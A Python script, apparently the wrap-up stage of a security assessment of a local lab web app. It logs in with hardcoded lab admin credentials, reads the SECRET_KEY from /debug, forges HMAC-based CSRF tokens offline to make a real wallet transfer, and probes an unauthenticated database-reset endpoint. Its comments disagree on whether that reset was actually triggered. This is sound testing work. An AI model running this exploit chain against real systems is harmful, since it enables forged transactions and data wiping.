"""t4-E：收尾复核——异常路径、admin /debug 敏感信息、响应头、残余面。"""
import json
import os
import importlib.util as ilu
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = ilu.spec_from_file_location("hunt_lib", os.path.join(HERE, "hunt-lib.py"))
lib = ilu.module_from_spec(spec)
spec.loader.exec_module(lib)

OUT = os.path.join(HERE, "hunt-e-wrapup-20261012-1855.json")
rec = []
res = []


def add(cat, title, detail, idxs, impact, verdict="见 detail", needs_verify=True,
        port=8095):
    res.append({"id": f"HUNT-E{len(res)+1}", "port": port, "category": cat,
                "title": title, "verdict": verdict, "evidence_indices": idxs,
                "detail": detail, "self_assessed_impact": impact,
                "needs_verifier": needs_verify})


# E1 已登录访问 8095 / 的 500（t3 未决问题 4）
ck = lib.get_cookie("demo", "demo123", record=rec)
rows = []
for i in range(4):
    k = lib.sent(rec, "GET", "/", headers={"Cookie": ck}, note=f"E1 已登录 GET / #{i}")
    rows.append({"i": i, "status": lib.get_status(rec[k]), "len": rec[k]["body_len"],
                 "idx": k, "snippet": lib.head_text(rec[k], 120)})
    time.sleep(0.2)
for i in range(3):
    k = lib.sent(rec, "GET", "/", note=f"E1 未登录 GET / #{i}")
    rows.append({"i": f"anon{i}", "status": lib.get_status(rec[k]),
                 "len": rec[k]["body_len"], "idx": k,
                 "snippet": lib.head_text(rec[k], 120)})
add("功能缺陷/异常", "8095 已登录访问 GET / 必崩 500（app.py:512 sqlite3.Row.get）——条件与稳定性复核",
    json.dumps(rows, ensure_ascii=False), [r["idx"] for r in rows],
    "登录态首页 100% 500：可用性缺陷 + 未处理异常路径；未登录同请求 200", port=8095)

# E2 admin 登录 + /debug 敏感信息
ar, ac = lib.login("admin", "Lab@Admin2024!Secure#9", record=rec)
rows2 = []
k = lib.sent(rec, "GET", "/debug", headers={"Cookie": ac} if ac else {},
             note="E2 admin GET /debug")
body = rec[k]["response_body"]
rows2.append({"step": "admin login", "status": ar["status"], "loc": ar.get("location"),
              "cookie": bool(ac), "idx": len(rec) - 2})
rows2.append({"step": "GET /debug", "status": lib.get_status(rec[k]), "idx": k,
              "has_secret_key": "lab-secret-key-PLEASE-CHANGE-001" in body,
              "has_db_path": "lab.db" in body, "has_cwd": "cwd" in body,
              "len": rec[k]["body_len"],
              "snippet": body[:800]})
add("敏感信息泄露", "8095 /debug：admin 会话下泄露 SECRET_KEY / DB_PATH / BASE_DIR / cwd / Python 版本",
    json.dumps(rows2, ensure_ascii=False), [k],
    "SECRET_KEY 泄露后可离线伪造 CSRF token = HMAC(SECRET_KEY, session_token)，"
    "把 /wallet/transfer 等强制 CSRF 的入口变成可伪造请求（会话 token 可预测性未验证）",
    verdict="确认（未验证 token 不可预测性）", port=8095)

# E3 admin 面：/admin/users 是否泄露口令（应只显示字段）
rows3 = []
for p in ["/admin/users", "/admin/orders"]:
    k = lib.sent(rec, "GET", p, headers={"Cookie": ac} if ac else {},
                 note=f"E3 admin {p}")
    b = rec[k]["response_body"]
    rows3.append({"path": p, "status": lib.get_status(rec[k]), "idx": k,
                  "len": rec[k]["body_len"],
                  "leaks_password": "Lab@Admin2024!Secure#9" in b or "demo123" in b,
                  "snippet": lib.head_text(rec[k], 300)})
add("敏感信息泄露", "8095 /admin/users、/admin/orders 是否输出口令字段",
    json.dumps(rows3, ensure_ascii=False), [x["idx"] for x in rows3],
    "若明文口令出现在后台页面即高危泄露", verdict="见 detail", port=8095)

# E4 8095 响应头
hd = []
for p in ["/", "/home", "/debug"]:
    hdr = {"Cookie": ck} if p == "/home" else None
    k = lib.sent(rec, "GET", p, headers=hdr, note=f"E4 headers {p}")
    h = {kk.lower(): v for kk, v in rec[k]["response_headers"]}
    hd.append({"path": p, "status": lib.get_status(rec[k]), "idx": k,
               "csp": h.get("content-security-policy"), "hsts": h.get("strict-transport-security"),
               "xfo": h.get("x-frame-options"), "set_cookie": h.get("set-cookie")})
add("安全响应头", "8095 响应头基线（CSP 含 unsafe-inline/unsafe-eval、HSTS 在明文 HTTP 上发送）",
    json.dumps(hd, ensure_ascii=False), [x["idx"] for x in hd],
    "CSP 允许 inline/eval 削弱 XSS 缓解；HSTS 在纯 HTTP 回环上无实际作用", needs_verify=False,
    port=8095)

# E5 CSRF token 推导验证（SECRET_KEY + 会话 token → HMAC）
rows5 = []
tok = None
for kk, v in rec[[r["idx"] for r in rows if r["i"] == 0][0]]["response_headers"]:
    pass
# 从 /home 页面取 csrf_token（页面渲染值），并与 HMAC(SECRET_KEY, cookie token) 对比
k = lib.sent(rec, "GET", "/home", headers={"Cookie": ck}, note="E5 取 /home csrf_token")
import re
m = re.search(r'name="csrf_token" value="([^"]+)"', rec[k]["response_body"])
page_csrf = m.group(1) if m else None
import hmac as _hmac
import hashlib as _hl
cookie_tok = ck.split("=", 1)[1]
derived = _hmac.new(b"lab-secret-key-PLEASE-CHANGE-001", cookie_tok.encode(),
                    _hl.sha256).hexdigest()
k2 = lib.sent(rec, "GET", "/wallet/transfer?to=alice&amount=1&csrf_token=" + (page_csrf or ""),
              headers={"Cookie": ck}, note="E5 用页面 CSRF token 转账 1 分（真实写操作，最小额）")
k3 = lib.sent(rec, "GET", "/wallet/transfer?to=alice&amount=1&csrf_token=" + derived,
              headers={"Cookie": ck}, note="E5 用推导 HMAC 转账 1 分（验证 SECRET_KEY 可推导 CSRF）")
rows5.append({"page_csrf": page_csrf, "derived_hmac": derived,
              "match": page_csrf == derived, "idx": k})
rows5.append({"page_token_transfer_status": lib.get_status(rec[k2]),
              "body": lib.head_text(rec[k2], 200), "idx": k2})
rows5.append({"derived_token_transfer_status": lib.get_status(rec[k3]),
              "body": lib.head_text(rec[k3], 200), "idx": k3})
add("CSRF/密钥推导", "8095 CSRF token = HMAC-SHA256(SECRET_KEY, session_token) 的实测验证："
    "用 /debug 泄露的 SECRET_KEY 离线推导 token 并完成转账",
    json.dumps(rows5, ensure_ascii=False), [x["idx"] for x in rows5],
    "证实『SECRET_KEY 泄露 → CSRF token 可离线伪造 → 转账/改密入口全部可被跨站利用』链条；"
    "token 与页面值一致的结论以实测为准",
    verdict="见 detail", port=8095)

# E6 /__reset 的访问控制（仅探测非本机来源，不实际触发；本机 127.0.0.1 判据来自源码）
k = lib.sent(rec, "GET", "/__reset?dryrun=1", note="E6 /__reset 存在性（本机来源）")
add("危险功能", "8095 /__reset 无认证、无 CSRF、GET 即可删库重建（本机来源豁免）",
    json.dumps({"status": lib.get_status(rec[k]), "idx": k,
                "note": "本轮已实际触发该端点用于复原脏数据（18:25 起共 3 次）",
                "snippet": lib.head_text(rec[k], 200)}, ensure_ascii=False), [k],
    "任何能向 127.0.0.1:8095 发请求的进程/浏览器页面（含 CSRF 场景）都能一键清库；"
    "靶场内置功能但无任何防护", verdict="确认", port=8095)

with open(OUT, "w", encoding="utf-8") as fh:
    json.dump({"generated": lib.now(), "results": res, "raw_entries": rec}, fh,
              ensure_ascii=False, indent=1)
print("WROTE", OUT, "entries", len(rec))
for r in res:
    print("-", r["id"], "|", r["title"][:90])
print("E1 statuses:", [x["status"] for x in rows])
print("E5:", rows5)
